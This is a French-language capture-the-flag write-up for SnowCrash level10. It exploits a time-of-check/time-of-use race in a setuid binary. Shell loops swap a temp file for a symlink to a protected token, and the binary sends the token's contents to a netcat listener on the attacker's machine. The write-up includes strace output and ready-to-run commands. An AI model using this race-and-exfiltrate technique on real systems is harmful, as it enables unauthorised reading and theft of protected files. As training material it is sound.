@@ -1,1 +1,95 @@
 http://www.cis.syr.edu/~wedu/Teaching/CompSec/LectureNotes_New/Race_Condition.pdf
+
+Race condition !!!!!
+
+Dans cette exercice, nous avons un programme qui lit un fichier et qui l'ecrit dans un socket.
+
+Voila l'usage du programme : ./level10 file host
+
+Si on test d'envoyer un fichier a une adresse bidon nous avons cette output :
+
+level10@SnowCrash:/tmp$ ~/level10 ~/ d
+Connecting to d:6969 .. Unable to connect to host d
+
+Donc l'envoie ce fait par le port 6969
+
+Si nous ecoutons le port avec netcat nous aurons donc le contenue du fichier en parametre.
+
+Sur la machine mere nous pouvons ecouter le port 6969
+
+nc -l 6969
+
+Testons de passer un fichier en parametre au programme et on specifie l'ip de la machine mere en second parametre.
+
+Sur la machine mere : ifconfig | grep inet
+
+Notre adresse ip commence par 10. .....
+
+Depuis l'iso SnowCrash, on lance le programme avec les bon parametre.
+
+echo "Hello world" /tmp/test
+
+./level10 /tmp/test 10.12.11.1
+
+Sur la machine mere on recoie bien le contenue de /tmp/test
+
+Super !!!
+
+Maintenant il faut faire la meme chose avec le fichier token. Petit bemole, nous n'avons pas les droits de lecture.
+
+en faisant un ls -l level10 on peut voir que le bnaire sera executer par l'user flag07 car il a un s (setuid) a la place du x dans les droit d'execution.
+
+Analysons avec strace le comportement du binaire.
+
+strace ./level10 /tmp/test 10.12.11.1 (N'oublions pas de relancer nc -l 6969 sur la machine mere pour etre tranquille on peut utiliser cette suite de commande "while true ; do ; nc -l 6969; done")
+
+Voila ce qui nous interesse:
+
+================================================================================================
+access("/tmp/test", R_OK)               = 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
+write(1, "Connecting to 10.12.11.1:6969 .."..., 33Connecting to 10.12.11.1:6969 .. ) = 33
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+connect(3, {sa_family=AF_INET, sin_port=htons(6969), sin_addr=inet_addr("10.12.11.1")}, 16) = 0
+write(3, ".*( )*.\n", 8)                = 8
+write(1, "Connected!\n", 11Connected!
+)            = 11
+write(1, "Sending file .. ", 16Sending file .. )        = 16
+open("/tmp/test", O_RDONLY)             = 4
+read(4, "Hello world\n", 4096)          = 12
+write(3, "Hello world\n", 12)           = 12
+write(1, "wrote file!\n", 12wrote file!
+)           = 12
+exit_group(12)                          = ?
+================================================================================================
+
+On voit que le syscall access est utiliser pour verifier les droits de lecture du fichier, plus loin le programme open le fichier.
+
+On a exploiter ce binaire plusieur etape
+
+1) Cree un fichier bidon (touch /tmp/toto)
+2) lancer le programme em lisant /tmp/toto (./level10 /tmp/toto 10.12.11.1)
+3) apres la verification avec access, supprimer le fichier toto et le remplacer par un lien qui pointe sur ~/token (rm /tmp/toto; ln -s ~/token toto)
+4) Nous avons le contenue de token dans la machine mere.
+
+Maleureusement l'execution est tres rapide et nous n'avons pas le temps de remplacer le fichier par un lien.
+
+Avec un script nous pouvons le faire.
+
+Le script qui tournera dans snow crash (depuis /tmp):
+
+while true; do touch /tmp/toto;rm toto ; ln -s ~/token /tmp/toto; rm toto; done
+
+On cree un fichier et on le remplace par un lien qui pointe sur token en boucle.
+
+maintenant on fait pareil pour executer le binaire :
+
+while true ; do clear; ~/level10 /tmp/toto 10.12.11.1; done
+
+Surprise : On a dans la machine mere le contenue du fichier :)
+
+puis
+
+su flag10
+getflag 
